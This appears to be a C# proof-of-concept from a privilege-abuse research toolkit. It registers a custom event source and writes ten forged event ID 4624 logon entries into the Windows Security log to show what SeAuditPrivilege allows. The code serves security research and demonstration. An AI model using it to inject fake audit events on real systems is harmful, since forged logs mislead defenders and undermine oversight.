using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SeAuditPrivilegePoC
{
    class SeAuditPrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum AUTHZ_REGISTRATION_FLAGS : uint
        {
            AUTHZ_ALLOW_MULTIPLE_SOURCE_INSTANCES = 1,
            AUTHZ_MIGRATED_LEGACY_PUBLISHER
        }

        [Flags]
        enum AUTHZ_REPORT_FLAGS : uint
        {
            APF_AuditFailure,
            APF_AuditSuccess
        }

        enum AUDIT_PARAM_TYPE
        {
            APT_None = 1,
            APT_String,
            APT_Ulong,
            APT_Pointer,
            APT_Sid,
            APT_LogonId,
            APT_ObjectTypeList,
            APT_Luid,
            APT_Guid,
            APT_Time,
            APT_Int64,
            APT_IpAddress,
            APT_LogonIdWithSid
        }

        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }


        /*
         * P/Invoke : Structs
         */
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct AUTHZ_REGISTRATION_OBJECT_TYPE_NAME_OFFSET
        {
            [MarshalAs(UnmanagedType.LPWStr)] public string szObjectTypeName;
            public int dwOffset;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct AUTHZ_SOURCE_SCHEMA_REGISTRATION
        {
            public uint dwFlags;
            [MarshalAs(UnmanagedType.LPWStr)] public string szEventSourceName;
            [MarshalAs(UnmanagedType.LPWStr)] public string szEventMessageFile;
            [MarshalAs(UnmanagedType.LPWStr)] public string szEventSourceXmlSchemaFile;
            [MarshalAs(UnmanagedType.LPWStr)] public string szEventAccessStringsFile;
            [MarshalAs(UnmanagedType.LPWStr)] public string szExecutableImagePath;
            public IntPtr pProviderGuid;
            public int dwObjectTypeNameCount;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            AUTHZ_REGISTRATION_OBJECT_TYPE_NAME_OFFSET[] ObjectTypeNames;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID
        {
            public byte Revision;
            public byte SubAuthorityCount;
            public SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public uint[] SubAuthority;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_IDENTIFIER_AUTHORITY
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public byte[] Value;

            public SID_IDENTIFIER_AUTHORITY(byte[] value)
            {
                Value = value;
            }
        }


        /*
         * P/Invoke : Win32 APIs
         */
        [DllImport("Authz.dll", SetLastError = true)]
        static extern bool AuthzInstallSecurityEventSource(
            uint dwFlags,
            in AUTHZ_SOURCE_SCHEMA_REGISTRATION pRegistration);

        [DllImport("Authz.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool AuthzRegisterSecurityEventSource(
            uint dwFlags,
            string szEventSourceName,
            out IntPtr phEventProvider);

        [DllImport("Authz.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool AuthzReportSecurityEvent(
            AUTHZ_REPORT_FLAGS dwFlags,
            IntPtr hEventProvider,
            int dwAuditId,
            IntPtr pUserSid,
            int dwCount,
            __arglist);

        [DllImport("Authz.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool AuthzReportSecurityEvent(
            AUTHZ_REPORT_FLAGS dwFlags,
            IntPtr hEventProvider,
            int dwAuditId,
            ref SID pUserSid,
            int dwCount,
            __arglist);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("ntdll.dll")]
        static extern int NtEnumerateSystemEnvironmentValuesEx(
            uint InformationClass,
            IntPtr Buffer,
            ref uint BufferLength);

        /*
         * Windows Consts
         */
        const int ERROR_ACCESS_DENIED = 5;
        const int ERROR_OBJECT_ALREADY_EXISTS = 5010;

        /*
         * User defined functions
         */
        static bool AddTestSecurityEvent(int eventId, int numEvents)
        {
            int error;
            bool status;
            int count = 0;
            string sourceName = "PrivFu";
            string fileName = "FakeEvent";
            var Registration = new AUTHZ_SOURCE_SCHEMA_REGISTRATION
            {
                dwFlags = (uint)AUTHZ_REGISTRATION_FLAGS.AUTHZ_ALLOW_MULTIPLE_SOURCE_INSTANCES,
                szEventSourceName = sourceName,
                szEventMessageFile = fileName,
                szEventAccessStringsFile = fileName,
                szExecutableImagePath = Assembly.GetEntryAssembly().Location
            };

            Console.WriteLine("[>] Trying to install event source.");
            Console.WriteLine("    |-> Source Name : \"{0}\"", sourceName);

            status = AuthzInstallSecurityEventSource(0, in Registration);
            error = Marshal.GetLastWin32Error();

            if (!status &&
                error != ERROR_OBJECT_ALREADY_EXISTS &&
                error != ERROR_ACCESS_DENIED)
            {
                Console.WriteLine("[-] Failed to install event source.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }
            else if (error == ERROR_ACCESS_DENIED)
            {
                Console.WriteLine("[-] Failed to install new event source.");
                Console.WriteLine("[*] To install event source, administrative privilege is required.");
                Console.WriteLine("[*] In the first time, you should execute this PoC from administrative console.");
            }
            else if (error == ERROR_OBJECT_ALREADY_EXISTS)
            {
                Console.WriteLine("[*] The specified event source already exists.");
            }
            else
            {
                Console.WriteLine("[+] The specified event source is installed successfully.");
            }

            Console.WriteLine("[>] Trying to register the installed event source.");

            if (!AuthzRegisterSecurityEventSource(
                0,
                sourceName,
                out IntPtr hEventProvider))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to install event source.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                Console.WriteLine("[+] The event source is registered successfully.");
                Console.WriteLine("    |-> Event Provider Handle : 0x{0}", hEventProvider.ToString("X16"));
            }

            Console.WriteLine("[>] Trying to create {0} security event(s).", numEvents);
            Console.WriteLine("    |-> Event ID : {0}", eventId);

            for (var idx = 0; idx < numEvents; idx++)
            {
                status = AuthzReportSecurityEvent(
                    AUTHZ_REPORT_FLAGS.APF_AuditSuccess,
                    hEventProvider,
                    eventId,
                    IntPtr.Zero,
                    3,
                    __arglist(
                        AUDIT_PARAM_TYPE.APT_Time,
                        DateTime.Now.ToFileTime(),
                        AUDIT_PARAM_TYPE.APT_String,
                        "This event is created to test SeAuditPrivilege capability.",
                        AUDIT_PARAM_TYPE.APT_String,
                        "If you have SeAuditPrivilege, you can create new events."));

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create new security event");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    count++;
                }
            }

            Console.WriteLine("[*] Done. {0} event(s) are created.", count);

            return (count > 0);
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            ProcessModuleCollection modules;
            FormatMessageFlags dwFlags;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            IntPtr pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                modules = Process.GetCurrentProcess().Modules;

                foreach (ProcessModule mod in modules)
                {
                    if (string.Compare(
                        Path.GetFileName(mod.FileName),
                        "ntdll.dll",
                        StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        pNtdll = mod.BaseAddress;
                        break;
                    }
                }

                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static void Main()
        {
            int numEvents = 10;
            Console.WriteLine("[*] If you have SeAuditPrivilege, you can create new events.");
            Console.WriteLine("[*] This PoC tries to add {0} security event.", numEvents);

            if (AddTestSecurityEvent(4624, numEvents))
            {
                Console.WriteLine("[*] If you cannot see new event(s) from this PoC in Security Logs, check and modify audit setting as follows:");
                Console.WriteLine("    (1) Open secpol.msc.");
                Console.WriteLine("    (2) [Security Settings] => [Local Policies] => [Audit Policy]");
                Console.WriteLine("    (3) Check \"Success\" of \"Audit object access\" and apply modification.");
            }
        }
    }
}
